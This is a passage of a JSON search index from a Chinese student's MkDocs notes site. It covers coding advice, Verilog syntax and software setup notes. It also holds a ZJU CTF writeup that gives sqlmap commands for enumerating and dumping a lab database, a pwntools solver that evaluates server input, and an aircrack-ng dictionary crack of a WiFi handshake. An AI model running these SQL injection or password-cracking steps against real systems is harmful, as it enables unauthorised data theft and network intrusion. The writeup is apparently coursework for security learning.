\u91cd\u65b0\u7ec4\u7ec7\u4ee3\u7801","text":"<p>\u8be5\u90e8\u5206\u4f1a\u8ba8\u8bba\u53ef\u4ee5\u5728\u51fd\u6570\u7ea7\u522b\u5bf9\u4ee3\u7801\u505a\u66f4\u5927\u7684\u6539\u52a8\uff0c\u5177\u4f53\u6765\u8bb2\uff0c\u6211\u4eec\u4f1a\u8bb2\u5230\u4e09\u79cd\u7ec4\u7ec7\u4ee3\u7801\u7684\u65b9\u6cd5\uff1a</p> <ol> <li>\u62bd\u53d6\u51fa\u90a3\u4e9b\u4e0e\u7a0b\u5e8f\u4e3b\u8981\u76ee\u7684\u201c\u4e0d\u76f8\u5173\u7684\u5b50\u95ee\u9898\u201d\u3002</li> <li>\u91cd\u65b0\u7ec4\u7ec7\u4ee3\u7801\u4f7f\u4ed6\u4e00\u6b21\u53ea\u505a\u4e00\u4ef6\u4e8b\u60c5\u3002</li> <li>\u5148\u7528\u81ea\u7136\u8bed\u8a00\u63cf\u8ff0\u4ee3\u7801\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u63cf\u8ff0\u6765\u5e2e\u52a9\u4f60\u627e\u5230\u66f4\u6574\u6d01\u7684\u89e3\u51b3\u65b9\u6848\u3002</li> </ol> <p>\u2705 \u5efa\u8bae\u4e00\uff1a\u5206\u79bb\u4ee3\u7801\u3002</p> <p>\u7b80\u800c\u8a00\u4e4b\uff0c\u5373\u628a\u201c\u4e00\u822c\u4ee3\u7801\u548c\u9879\u76ee\u4e13\u6709\u7684\u4ee3\u7801\u5206\u5f00\u201d\u3002</p> <p>\u2705 \u5efa\u8bae\u4e8c\uff1a\u4e00\u6b21\u53ea\u505a\u4e00\u4ef6\u4e8b\u3002</p> <p>\u5c06\u6240\u6709\u8981\u505a\u7684\u4efb\u52a1\u5206\u51fa\u6765\uff0c\u5e76\u8fd9\u4e9b\u4efb\u52a1\u53d8\u6210\u5355\u72ec\u7684\u51fd\u6570\u6291\u6216\u4ee3\u7801\u4e2d\u7684\u4e00\u4e2a\u6bb5\u843d\u3002</p> <p>\u2705 \u5efa\u8bae\u4e09\uff1a\u5c06\u60f3\u6cd5\u53d8\u6210\u4ee3\u7801\u3002</p> <p>\u2705 \u5efa\u8bae\u56db\uff1a\u5c11\u4e9b\u4ee3\u7801\u3002</p> <p>\u5728\u9047\u5230\u95ee\u9898\u65f6\uff0c\u7b2c\u4e00\u53cd\u5e94\u4e0d\u5f53\u662f\u81ea\u5df1\u53bb\u5199\u4e00\u4e2a\u529f\u80fd\u53bb\u89e3\u51b3\u9700\u6c42\u3002\u82e5\u80fd\u8bc9\u8bf8\u73b0\u6709\u7684\u5e93\u6216\u8005\u7cfb\u7edf\u5de5\u5177\u89e3\u51b3\uff0c\u4f7f\u7528\u8fd9\u4e9b\u6210\u719f\u7684\u5de5\u5177\u53ef\u80fd\u8981\u6bd4\u4ece\u5934\u5f00\u59cb\u8bbe\u8ba1\u53ef\u9760\u7684\u591a\u3002</p>"},{"location":"misc/schoolbus/","title":"ZJU SchoolBus Writeup","text":"<p>Web</p> <p>EasyWeb</p> <p>\u7b2c\u4e00\u5173\uff08.bak\uff09</p> <p>\u67e5\u770b.bak\u6587\u4ef6</p> <p>http://10.214.160.13:10000/1.php.bak</p> <pre><code>&lt;html&gt;\n&lt;head&gt;\n  &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;\n  &lt;meta http-equiv=\"Content-Language\" content=\"zh-CN\" /&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div align=\"center\"&gt;\n&lt;h1&gt;\u6b22\u8fce\u6765\u5230\u7b2c\u4e00\u5173&lt;/h1&gt;\n&lt;/div&gt;\n&lt;!-- \u5220\u96641.php.bak --&gt;\n&lt;a href=\"the2nd.php\"&gt;\u8fdb\u5165\u7b2c\u4e8c\u5173&lt;/a&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u7b2c\u4e8c\u5173\uff08XSS\uff09</p> <p>\u8de8\u811a\u672c\u6f0f\u6d1eXSS</p> <p>\u76f8\u5173\u9605\u8bfb</p> <p>\u76ee\u524d\u4f7f\u7528chrome\u7834\u89e3\u5931\u8d25\u4e86</p> <p>\u597d\u50cffirefox\u76f4\u63a5\u7981\u6389\u5f39\u7a97\u53ef\u4ee5\u7ed5\u8fc7\u53bb</p> <p>\u7b2c\u4e09\u5173\uff08\u6d88\u606f\u5934\uff09</p> <p>\u7f51\u7edc\\(\\to\\) disiguan.php\\(\\to\\) Headers\\(\\to\\) Response Headers(wozaizheli.php)</p> <p>\u7b2c\u56db\u5173</p> <p>\u5220\u6389\u9009\u4e2d\u884c\u7684display\u5f97\u5230flag</p> <p></p> <p>SQLinjection</p> <p>\u5728\u540e\u53f0\u6570\u636e\u5e93\u4e2d\u627e\u4e00\u4e2a\u540d\u53ebflag_is_here\u7684\u8868\u91cc\u7684flag</p> <p>SQLMAP\u7684\u4f7f\u7528</p> <p>\u57fa\u672c\u64cd\u4f5c</p> <p>\u601d\u8def\uff1a\u83b7\u53d6\u6570\u636e\u5e93\u540d\u79f0\uff0c\u5f97\u77e5\u6240\u9700\u8981\u7684\u8868\u540d\uff0c\u83b7\u53d6\u5217\u540d\uff0c\u83b7\u53d6\u6307\u5b9a\u5217\u540d\u5b57\u6bb5</p> <pre><code>python3 sqlmap.py -u http://10.214.160.13:10002/?questionid=0\n</code></pre> <p></p> <pre><code>python3 sqlmap.py -u http://10.214.160.13:10002/?questionid=0 --dbs\n</code></pre> <p></p> <pre><code>python3 sqlmap.py -u http://10.214.160.13:10002/?questionid=0 -D aaa_web2 --tables\n</code></pre> <p></p> <pre><code>python3 sqlmap.py -u http://10.214.160.13:10002/?questionid=0 -D aaa_web2 -T flag_is_here --column\n</code></pre> <p></p> <pre><code>sqlmap.py -u http://10.214.160.13:10002/?questionid=0 -D aaa_web2 -T flag_is_here -C \"flag\" --dump\n</code></pre> <p></p> <p>PPC</p> <p>calculator</p> <p>\u57fa\u672c\u64cd\u4f5c</p> <p>Description</p> <p>\u7f16\u7a0b\u662f\u6700\u91cd\u8981\u7684\u6280\u80fd\uff0c\u6ca1\u6709\u4e4b\u4e00  \u6211\u5c31\u4e0d\u4fe1\u4f60\u7684\u624b\u901f\u8db3\u591f\u5febhhh  nc 10.214.160.13 11002  nc\u662fLinux\u81ea\u5e26\u7684\u5de5\u5177\uff0c\u7528\u4e8e\u4e0e\u670d\u52a1\u5668\u5efa\u7acbsocket\u8fde\u63a5</p> <p>Solution</p> <p>\u5165\u95e8\u94fe\u63a5</p> <p>\u6ce8\u610fbytes\u7c7b\u548cstring\u7c7b\u7684\u533a\u522b\u4e0e\u76f8\u4e92\u8f6c\u6362</p> <pre><code>from pwn import *\np=remote('10.214.160.13',11002)\np.recvlines(7)\nfor i in range(10):\n    s=p.recvuntil('=')\n    s=bytes.decode(s)\n    if i == 0:\n        s=s[:-2]\n    else:\n        s=s[15:-2]\n    sum=eval(s) \n    print(s)\n    print(sum)\n    sum = str.encode(str(sum))\n    p.sendline(sum)\ns=p.recvlines(4)\nprint(s)\n</code></pre> <p>WUD1T1</p> <p>\u5927\u6982\u5c31\u662f\u6839\u636e\u9898\u9762\u7ed9\u51fa\u7684\u4fe1\u606f\u786e\u5b9a\u8eab\u4efd\u8bc1\u7684\u67d0\u51e0\u4f4d\uff0c\u5176\u4ed6\u7684\u66b4\u529b\u679a\u4e3e</p> <p>md5\u52a0\u5bc6</p> <pre><code>import hashlib\ndef get_md5(s):\n    md = hashlib.md5()\n    md.update(s.encode('utf-8'))\n    return md.hexdigest()\n</code></pre> <p>Reverse</p> <p>Reverse1</p> <p>\u4e00\u9053\u7b80\u5355\u7684\u9006\u5411\u9898</p> <p>flag\u52a0\u5bc6\u5b58\u4e8e\u5185\u5b58\u533a\u5185\uff0c\u4e0eCh\u5f02\u6216\u540e\u53d6\u51fa\u503c</p> <pre><code>using namespace std;\nvoid int2str(const int &amp;int_temp,string &amp;string_temp)  \n{  \n    char s;    \n    s = (char)int_temp; \n    string_temp=s;  \n}  \nint main(){\n    int x;\n    string s=\"\";\n    while(1){\n        scanf(\"%x\",&amp;x);\n        x^=12;\n        printf(\"%d %c\\n\",x, (char)x);\n        string c;\n        int2str(x,c);\n        s+=c;\n        cout&lt;&lt;s&lt;&lt;endl;\n    }\n} \n</code></pre> <p></p> <p>MISC</p> <p>WUD1T2</p> <p>aircrack-ng\u649e\u5e93</p> <p>\u9898\u76ee\u5df2\u7ed9\u51fa\u63e1\u624b\u5305\uff0c\u76f4\u63a5\u7528\u73b0\u6709\u7684\u5b57\u5178\u5e93\u7834\u89e3\u5c31\u884c</p> <pre><code>aircrack-ng -w password.txt crack_zju-01.cap \n</code></pre> <p>vim .swp\u6587\u4ef6\u590d\u539f</p> <pre><code>vim -r \u590d\u539f\u6587\u4ef6\u540d\uff08\u4e0d\u5e26.swp\uff09\n</code></pre>"},{"location":"misc/verilog/","title":"Verilog \u8bed\u6cd5\u624b\u518c","text":"<p>Info</p> <p>\u56e0\u4e3a\u8981\u5f53 2022-2023 Fall \u8ba1\u7b97\u673a\u7cfb\u7edf\u2161 \u7684\u52a9\u6559\uff0c\u6240\u4ee5\u7279\u5730\u6765\u590d\u4e60\u4e00\u4e0b verilog\u3002</p>"},{"location":"misc/verilog/#0","title":"0 \u63a8\u8350\u8d44\u6599","text":"<ul> <li>USTC Verilog OJ | \u638c\u63e1 Verilog \u57fa\u7840\u8bed\u6cd5\u4e0e\u6613\u9519\u70b9</li> <li>Synthesizable Coding of Verilog | \u9605\u8bfb17-31\u9875</li> </ul>"},{"location":"misc/verilog/#1","title":"1 \u8bed\u6cd5\u8865\u5145","text":""},{"location":"misc/verilog/#11-case","title":"1.1 Case","text":"<pre><code>always@(*) begin\n    case(sel) \u00a0 \u00a0 \u00a0 \u00a0 // case \u8bed\u53e5\u4f7f\u7528\u65b9\u6cd5\uff1acase ... endcase\n        3'b000: begin // \u591a\u8bed\u53e5\u4f7f\u7528 begin...end \u5305\u88f9\n            out = data0;\n        end\n        3'b001: out = data1;\n        3'b010: out = data2;\n        3'b011: out = data3;\n        default: out = 4'b0;\n    endcase\nend\n</code></pre>"},{"location":"misc/verilog/#12","title":"1.2 \u4f4d\u62fc\u63a5","text":"<pre><code>module top_module (\n    input [4:0] a, b, c, d, e, f,\n    output [7:0] w, x, y, z );\n    assign {w, x, y, z} = {a, b, c, d, e, f, 2'b11}; // \u4f4d\u62fc\u63a5\uff0c\u9700\u4fdd\u6301\u524d\u540e\u4f4d\u5bbd\u4e00\u81f4\u3002\nendmodule\n</code></pre>"},{"location":"misc/verilog/#13","title":"1.3 \u5f52\u7ea6\u8fd0\u7b97\u7b26","text":"<pre><code>x1 = &amp; a[3:0] // AND: a[3]&amp;a[2]&amp;a[1]&amp;a[0]. Equivalent to (a[3:0] == 4'hf)  \nx2 = | b[3:0] // OR: b[3]|b[2]|b[1]|b[0]. Equivalent to (b[3:0] != 4'h0)  \nx3 = ^ c[2:0] // XOR: c[2]^c[1]^c[0]\n</code></pre>"},{"location":"misc/verilog/#14","title":"1.4 \u6a21\u5757\u5b9a\u4e49\u53ca\u5176\u5b9e\u4f8b\u5316","text":"<p>\u5728\u5b9a\u4e49\u6a21\u5757\u65f6\uff0c\u6211\u4eec\u4f1a\u5728\u62ec\u53f7\u4e2d\u5b9a\u4e49\u6b64\u6a21\u5757\u7684\u8bfb\u53e3\u548c\u5199\u53e3\uff0c\u540c\u65f6\u5728 <code>module...endmodule</code> \u4e2d\u63cf\u8ff0\u6574\u4e2a\u6a21\u5757\u7684\u884c\u4e3a\uff08\u5305\u62ec\u4e00\u4e9b <code>assign</code> \u8bed\u53e5\u3001<code>always</code> \u5757\uff0c\u6291\u6216\u662f <code>reg</code> \u548c <code>wire</code> \u7684\u7533\u660e\u7b49\u7b49\uff09\u3002</p> <p>\u5bf9\u4e8e\u6a21\u5757\u7684\u5199\u53e3\uff0c\u4e00\u5171\u6709\u4e24\u79cd\u5199\u6cd5\uff0c\u4e00\u79cd\u662f <code>output reg xxx</code>\uff0c\u4e00\u79cd\u662f <code>output wire xxx</code>\uff08\u4e5f\u53ef\u88ab\u7b80\u5199\u4e3a <code>output xxx</code>\uff09\u3002<sup>1</sup></p> <ul> <li>\u82e5\u5199\u53e3\u5728 <code>always</code> \u8bed\u53e5\u4e2d\u88ab\u8d4b\u503c\uff0c\u5219\u58f0\u660e\u6210 <code>reg</code> \u7c7b\u578b\uff1b</li> <li>\u82e5\u5199\u53e3\u5728 <code>assign</code> \u8bed\u53e5\u4e2d\u88ab\u8d4b\u503c\uff0c\u5219\u58f0\u660e\u6210 <code>wire</code> \u7c7b\u578b\uff08wire \u53ef\u7701\u7565\uff09\u3002</li> </ul> <p>\u5173\u4e8e\u6a21\u5757\u7684\u5b9e\u4f8b\u5316\uff0c\u53ef\u4ee5\u53c2\u8003\u4e0b\u65b9\u4ee3\u7801\u3002</p> <pre><code>module mod_a ( // \u4e00\u4e2a\u6a21\u5757\n    output   out1, // \u5199\u53e3\n    input    in1,  // \u8bfb\u53e3\n    input    in2  );\n    // \u63cf\u8ff0\u6a21\u5757\u884c\u4e3a\n    assign out1 = in1 &amp; in2;\nendmodule\n\nmodule top_module (  // \u9876\u5c42\u6a21\u5757\n    input   a,\n    input   b,\n    output  out1\n);\n    // \u5b9e\u4f8b\u5316\u6a21\u5757 mod_a\uff0c\u683c\u5f0f\uff1a[\u6a21\u5757\u540d] [\u5b9e\u4f8b\u540d\u79f0]( );\n    mod_a mod( \n        .in1(a), // \u5c06 top_module \u7684 a \u4e0e mod_a \u7684 in1 \u8fde\u63a5\n        .in2(b),\n        .out1(out1)\n    );\nendmodule\n</code></pre>"},{"location":"misc/verilog/#2","title":"2 \u8bed\u6cd5\u533a\u5206","text":""},{"location":"misc/verilog/#21-2","title":"2.1 \u963b\u585e\u8d4b\u503c &amp; \u975e\u963b\u585e\u8d4b\u503c<sup>2</sup>","text":"<p>\u5728Verilog\u4e2d\uff0c\u6709\u4e09\u79cd\u8d4b\u503c\u65b9\u5f0f\uff0c\u5206\u522b\u4e3a\uff1a</p> <ul> <li>\u8fde\u7eed\u8d4b\u503c\uff08\u5982 <code>assign x = y;</code> \uff09\uff0c\u8be5\u8d4b\u503c\u65b9\u5f0f\u53ea\u80fd\u7528\u4e8e\u8fc7\u7a0b\u5757\uff08\u5982 always \u5757\uff09\u4e4b\u5916\uff1b</li> <li>\u963b\u585e\u8d4b\u503c\uff08\u5982 <code>x = y;</code> \uff09\uff0c\u8be5\u8d4b\u503c\u65b9\u5f0f\u53ea\u80fd\u7528\u5728\u8fc7\u7a0b\u5757\uff08\u5982 <code>always@\uff08*\uff09</code>\uff09\u5185\uff1b</li> <li>\u975e\u963b\u585e\u8d4b\u503c\uff08\u5982 <code>x &lt;= y;</code> \uff09\uff0c\u8be5\u8d4b\u503c\u65b9\u5f0f\u53ea\u80fd\u7528\u5728\u8fc7\u7a0b\u5757\u5185\uff08 \u5982 <code>always@\uff08posedge clk\uff09</code> \uff09\u3002</li> </ul> <p>\u5728\u8bbe\u8ba1Verilog\u6a21\u5757\u65f6\uff0c\u8bf7\u9075\u5faa\u4ee5\u4e0b\u539f\u5219\uff1a</p> <ul> <li>\u5728\u7ec4\u5408\u903b\u8f91\u7684 always \u5757\u5185\u91c7\u7528\u963b\u585e\u8d4b\u503c\uff1b</li> <li>\u65f6\u5e8f\u903b\u8f91\u7684 always \u5757\u5185\u91c7\u7528\u975e\u963b\u585e\u8d4b\u503c\u3002</li> </ul> <p>\u4ece\u539f\u7406\u4e0a\u6765\u8bb2\uff0c\u975e\u963b\u585e\u8d4b\u503c\u7684\u8bed\u53e5\u662f\u540c\u65f6\u6267\u884c\u7684\uff1b\u800c\u963b\u585e\u8d4b\u503c\u7684\u8bed\u53e5\u662f\u987a\u5e8f\u6267\u884c\u7684\u3002</p> <pre><code>// \u5728 clk \u4e0a\u5347\u6cbf\u65f6\uff0c\u4ea4\u6362 a \u548c b\u3002\nalways@(posedge clk) begin\n    a &lt;= b;\n    b &lt;= a;\nend\n</code></pre> <p>\u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4e0b\u65b9\u7684\u4f8b\u5b50\uff0c\u6765\u5177\u4f53\u611f\u53d7\u963b\u585e\u8d4b\u503c\u548c\u975e\u963b\u585e\u8d4b\u503c\u7684\u533a\u522b\u3002</p> <pre><code>always@(posedge clk) begin\n    b = a;\n    c = b;\nend\n</code></pre> <p>\u963b\u585e\u8d4b\u503c\u751f\u6210\u7684\u7535\u8def\u56fe\u5982\u4e0b\u56fe\u6240\u793a\uff1a </p> <pre><code>always@(posedge clk) begin\n    b &lt;= a;\n    c &lt;= b;\nend\n</code></pre> <p>\u975e\u963b\u585e\u8d4b\u503c\u751f\u6210\u7684\u7535\u8def\u56fe\u5982\u4e0b\u56fe\u6240\u793a\uff1a </p>"},{"location":"misc/verilog/#22-always-3","title":"2.2 \u4f7f\u7528 always \u7684\u7ec4\u5408\u7535\u8def<sup>3</sup>","text":"<p>\u4e00\u822c\u90fd\u8bf4\u7ec4\u5408\u903b\u8f91\u7535\u8def\u4f7f\u7528 <code>always@(*) {}</code>\uff0c\u90a3\u4e48\u5176\u4e2d\u7684 <code>*</code> \u8868\u8fbe\u7684\u662f\u4ec0\u4e48\u610f\u601d\u5462\uff1f</p> <p>\u7b54\uff1a<code>always</code> \u8bed\u53e5\u540e\u7684\u62ec\u53f7\u5185\u653e\u7684\u662f\u654f\u611f\u53d8\u91cf\u5217\u8868\uff0c\u5bf9\u4e8e <code>always@(*) out = a &amp; b | c ^ d</code> \u6765\u8bf4\uff0c\u5176\u5b8c\u6574\u5199\u6cd5\u662f <code>always@(a, b, c, d) out = a &amp; b | c ^ d</code>\u3002</p> <p>\u7ec4\u5408\u903b\u8f91\u7535\u8def\u4e2d\uff0c<code>always</code> \u5757\u548c <code>assign</code> \u8bed\u53e5\u4e8c\u8005\u751f\u6210\u7684\u786c\u4ef6\u7535\u8def\u4e00\u822c\u662f\u7b49\u6548\u7684\u3002 \u4f46\u662f <code>always</code> \u8bed\u53e5\u53ef\u4ee5\u652f\u6301\u66f4\u52a0\u590d\u6742\u7684\u8bed\u6cd5\u3002</p> <ul> <li><code>always</code> \u4e2d\u53ef\u4ee5\u4f7f\u7528 <code>if...else...</code>\uff0c<code>case</code> \u7b49\u8bed\u6cd5\u3002</li> <li><code>always</code> \u4e2d\uff0c\u7b49\u53f7\u5de6\u8fb9\u7684\u53d8\u91cf\u4e3a <code>Reg</code> \u7c7b\u578b\uff1b<code>assign</code> \u4e2d\uff0c\u7b49\u53f7\u5de6\u8fb9\u7684\u53d8\u91cf\u4e3a <code>wire</code> \u7c7b\u578b\u3002</li> <li><code>always</code> \u5757\u5185\u53ef\u5bf9\u591a\u4e2a\u4fe1\u53f7\u8fdb\u884c\u8d4b\u503c\uff0c<code>assign</code> \u8bed\u53e5\u53ea\u80fd\u5bf9\u4e00\u4e2a\u4fe1\u53f7\u8fdb\u884c\u8d4b\u503c\u3002</li> </ul>"},{"location":"misc/verilog/#3","title":"3 \u6613\u9519\u70b9","text":""},{"location":"misc/verilog/#31-4","title":"3.1 \u5206\u652f\u8bed\u53e5\u7f3a\u5931\u5bfc\u81f4\u9501\u5b58\u5668<sup>4</sup>","text":"<pre><code>always @(*) begin\n    if (cpu_overheated)\n       shut_off_computer = 1;\nend\n</code></pre> <p>\u7531\u4e8e\u7f3a\u5c11 <code>else</code> \u7684\u60c5\u51b5\uff0c<code>shut_off_computer</code> \u5728 <code>cpu_overhead</code> \u4e3a 0 \u65f6\uff0c\u4f1a\u4fdd\u6301\u539f\u6765\u7684\u503c\u3002 </p> <p>\u82e5\u60f3\u8981\u5728 <code>cpu_overheated = 0</code> \u65f6\uff0c\u5c06 <code>shut_off_computer</code> \u7f6e\u4e3a 0\uff0c\u5219\u9700\u8981\u4f7f\u7528\u4e0b\u65b9\u903b\u8f91\uff1a</p> <pre><code>always @(*) begin\n    if (cpu_overheated)\n        shut_off_computer = 1;\n    else \n        shut_off_computer = 0;\nend\n</code></pre>"},{"location":"misc/verilog/#32","title":"3.2 \u7ec4\u5408\u903b\u8f91\u4e2d\u81ea\u6211\u53cd\u9988","text":"<pre><code>// \u9519\u8bef\u793a\u8303\nalways @(*) begin // \u7ec4\u5408\u903b\u8f91\n    a = a + 1; // \u81ea\u6211\u53cd\u9988\nend\n</code></pre> <ol> <li> <p>https://stackoverflow.com/questions/5360508/using-wire-or-reg-with-input-or-output-in-verilog\u00a0\u21a9</p> </li> <li> <p>https://verilogoj.ustc.edu.cn/oj/problem/68\u00a0\u21a9</p> </li> <li> <p>https://verilogoj.ustc.edu.cn/oj/problem/62\u00a0\u21a9</p> </li> <li> <p>https://verilogoj.ustc.edu.cn/oj/problem/95\u00a0\u21a9</p> </li> </ol>"},{"location":"rec/","title":"\u4e00\u4e9b\u63a8\u8350","text":""},{"location":"rec/#_2","title":"\u63a8\u8350\u9605\u8bfb","text":"<ul> <li>\u63d0\u95ee\u7684\u667a\u6167</li> <li>The illustrated guide to a Ph.D.</li> <li>\u7cbe\u901a\u4e00\u4ef6\u4e8b\u9700\u898110000\u5c0f\u65f6\uff0c\u4f46\u5b66\u4f1a\u4e00\u4ef6\u4e8b\uff0c\u53ea\u9700\u898120\u5c0f\u65f6</li> </ul>"},{"location":"rec/#_3","title":"\u5b66\u4e60\u8d44\u6e90","text":"<ul> <li>CS\u81ea\u5b66\u6307\u5357|\u81ea\u5b66\u6307\u5357</li> <li>\u9b3c\u8c37\u5927\u5b66|\u81ea\u5b66\u6307\u5357/\u56fd\u5916\u8d44\u6e90\u7ffb\u8bd1</li> <li>\u6d59\u6c5f\u5927\u5b66\u8bfe\u7a0b\u8d44\u6e90\u5171\u4eab\u8ba1\u5212</li> <li>The Missing Semester of Your CS Education|CS\u524d\u7f6e\u77e5\u8bc6</li> <li>\u54d4\u54e9\u54d4\u54e9\u848b\u708e\u5ca9|\u64cd\u4f5c\u7cfb\u7edf/\u8ba1\u7b97\u673a\u7cfb\u7edf\u57fa\u7840</li> <li>Learn X in Y minutes|\u5feb\u901f\u5165\u95e8\u4e00\u95e8\u7f16\u7a0b\u8bed\u8a00</li> <li>\u8001\u77f3\u8c08\u82af|\u82af\u7247\u9886\u57df\u79d1\u666e</li> </ul>"},{"location":"rec/#_4","title":"\u63a8\u8350\u8f6f\u4ef6","text":"<ul> <li>Notion|All in one\u5728\u7ebf\u7b14\u8bb0/\u4e2a\u4eba\u535a\u5ba2/\u534f\u4f5c\u8f6f\u4ef6</li> <li>Obsidian|\u79bb\u7ebfmarkdown\u7f16\u8f91\u5668/\u77e5\u8bc6\u5e93</li> <li>Listary|\u672c\u5730\u6587\u4ef6\u67e5\u627e/\u8f6f\u4ef6\u52a0\u8f7d</li> </ul>"},{"location":"rec/#_5","title":"\u63a8\u8350\u8ba2\u9605","text":"<ul> <li>\u962e\u4e00\u5cf0\u7684\u7f51\u7edc\u65e5\u5fd7-\u79d1\u6280\u7231\u597d\u8005\u5468\u520a</li> <li>\u54b8\u9c7c\u8086</li> <li>Hacker News</li> </ul>"},{"location":"rec/#_6","title":"\u5c0f\u5de5\u5177\u63a8\u8350","text":"<ul> <li>Excalidraw|\u5728\u7ebf\u65e0\u9650\u753b\u5e03</li> <li>carbon|\u4ee3\u7801\u5757\u56fe\u7247\u751f\u6210</li> <li>Zlibrary|\u4e16\u754c\u6700\u5927\u7684\u514d\u8d39\u7535\u5b50\u4e66\u5e93</li> </ul>"},{"location":"tutorials/","title":"Introduction","text":"<p>\u5728\u8fd9\u91cc\u4f1a\u653e\u7f6e\u5e73\u5e38\u641e\u9879\u76ee/\u6478\u9c7c\u65f6\u9047\u5230\u7684\u4e00\u4e9b\u95ee\u9898\uff0c\u4ee5\u53ca\u5176\u89e3\u51b3\u65b9\u5f0f\u3002\u5e0c\u671b\u5bf9\u4f60\u80fd\u6709\u6240\u5e2e\u52a9\u3002</p>"},{"location":"tutorials/idea/","title":"IDEA \u8e29\u5751\u8bb0\u5f55","text":"<p>Info</p> <p>\u6700\u8fd1\u5f00\u59cb\u4f7f\u7528 JetBrain \u7684\u4ea7\u54c1\uff0c\u201c\u9996\u5f53\u5176\u51b2\u201d\u7684\u5f53\u7136\u5c31\u662f IDEA \u4e86\uff0c\u7528\u6b64\u8d34\u8bb0\u5f55\u4e00\u4e0b\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u8e29\u5751/\u611f\u89c9\u5b9e\u7528\u7684\u70b9\u3002</p>"},{"location":"tutorials/mkdocs/","title":"MkDocs \u5b89\u88c5\u8bb0\u5f55","text":""},{"location":"tutorials/mkdocs/#_1","title":"\u672c\u5730\u73af\u5883\u914d\u7f6e","text":"<pre><code>pip install mkdocs-material\nmkdocs new .\n</code></pre>"},{"location":"tutorials/mkdocs/#mkdocsyml","title":"\u4fee\u6539mkdocs.yml","text":"<p>\u8bbe\u7f6ematerial\u4e3b\u9898</p> <pre><code>theme:\n\u00a0 name: material\n</code></pre>"},{"location":"tutorials/mkdocs/#_2","title":"\u8fdc\u7a0b\u90e8\u7f72","text":"<p>\u91c7\u7528Github\u8fdc\u7a0b\u90e8\u7f72</p>"},{"location":"tutorials/mkdocs/#1-github","title":"1. \u521b\u5efagithub\u4ed3\u5e93","text":""},{"location":"tutorials/mkdocs/#2","title":"2. \u4e0a\u4f20\u672c\u5730\u7684\u4ee3\u7801","text":""},{"location":"tutorials/mkdocs/#3-github-action","title":"3. \u8bbe\u7f6egithub action","text":"<p>\u4f7f\u7528\u4e0b\u65b9\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u65b0\u7684github action <pre><code>name: ci \non:\n    push:\n    branches:\n        - master \n        - main\njobs:\n    deploy:\n    runs-on: ubuntu-latest\n    steps:\n        - uses: actions/checkout@v2\n        - uses: actions/setup-python@v2\n        with:\n            python-version: 3.x\n        - run: pip install mkdocs-material \n        - run: mkdocs gh-deploy --force\n</code></pre></p>"},{"location":"tutorials/mkdocs/#4","title":"4. \u8bbe\u7f6e\u6e32\u67d3\u5206\u652f","text":"<p>\u5728Setting\u9875\u8bbe\u7f6e\u6e32\u67d3\u7684\u5206\u652f </p>"},{"location":"tutorials/mkdocs/#5","title":"5. \u81ea\u52a8\u6e32\u67d3","text":"<p>\u7b49\u5019\u6e32\u67d3\u6210\u529f\uff0c\u5373\u53ef\u8bbf\u95ee <code>&lt;username&gt;.github.io/repository_name</code></p>"},{"location":"tutorials/mkdocs/#_3","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>\u4f7f\u7528MkDocs \u5feb\u901f\u642d\u5efa\u6587\u6863\u7cfb\u7edf</li> <li>MkDocs Material</li> <li>Github\u591a\u57df\u540d\u90e8\u7f72</li> </ul>"},{"location":"tutorials/rsshub/","title":"RSSHub \u4f7f\u7528\u8bb0\u5f55","text":"<p>Note</p> <p>\u76ee\u524d\u91c7\u7528\u7684\u662fdocker\u90e8\u7f72\uff0c\u957f\u671f\u4f7f\u7528\u6bd4\u8f83\u7a33\u5b9a\uff0c\u7f3a\u70b9\u53ef\u80fd\u662f\u4e3a\u914d\u5408RSSHub radar\uff0c\u9700\u8981\u5076\u5c14\u624b\u52a8\u66f4\u65b0docker\u955c\u50cf\u3002</p>"},{"location":"tutorials/rsshub/#rsshub_1","title":"RSSHub\u5b89\u88c5","text":"<ol> <li>\u9700\u8981\u4e00\u4e2a\u670d\u52a1\u5668/\u4e0d\u65ad\u7535\u7684\u673a\u5b50</li> <li>\u5b89\u88c5docker</li> <li>\u90e8\u7f72RSSHub\u955c\u50cf     <pre><code>$ docker pull diygod/rsshub\n$ docker run -d --name rsshub -p 1200:1200 diygod/rsshub\n</code></pre></li> <li>\u6253\u5f00ip:1200\uff0c\u82e5\u663e\u793a\u4e0b\u65b9\u5185\u5bb9\uff0c\u5219\u90e8\u7f72\u6210\u529f</li> </ol>"},{"location":"tutorials/rsshub/#rsshub_2","title":"RSSHub\u66f4\u65b0","text":"<pre><code>$ docker stop rsshub\n$ docker rm rsshub\n$ docker pull diygod/rsshub\n$ docker run -d --name rsshub -p 1200:1200 diygod/rsshub\n</code></pre>"},{"location":"tutorials/rsshub/#reference","title":"Reference","text":"<ul> <li>[RSSHub Docker\u90e8\u7f72](https://docs.rsshub.app/install/</li> </ul>"},{"location":"tutorials/ubuntu/","title":"Ubuntu22.04 \u5b89\u88c5\u8bb0\u5f55","text":""},{"location":"tutorials/ubuntu/#0","title":"0. \u57fa\u7840\u8f6f\u4ef6","text":"<pre><code>$ sudo apt install tmux\n$ sudo apt install git\n$ sudo apt install vim\n$ sudo apt install make\n$ sudo apt install g++\n</code></pre>"},{"location":"tutorials/ubuntu/#1-chrome","title":"1. Chrome\u6d4f\u89c8\u5668","text":"<p>\u53c2\u8003\u5b89\u88c5\u6587\u7ae0</p>"},{"location":"tutorials/ubuntu/#2","title":"2. \u4e2d\u6587\u8f93\u5165\u6cd5","text":"<p>\u53c2\u8003\u5b89\u88c5\u6587\u7ae0</p>"},{"location":"tutorials/ubuntu/#3-ssh","title":"3. \u5c40\u57df\u7f51 ssh \u767b\u5f55","text":""},{"location":"tutorials/ubuntu/#1-zjunet","title":"1) zjunet","text":"<p>ZJUNET\u4ed3\u5e93</p> <pre><code>$ zjunet user add # \u6ce8\u610fuser name \u540e\u9762\u8981\u63a5\u4e0a@abc\uff0c\u5176\u4e2da\u8868\u793a10\u5143\uff0cb\u8868\u793a30\u5143\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\n$ zjunet vpn -c\n</code></pre>"},{"location":"tutorials/ubuntu/#2-ssh","title":"2) 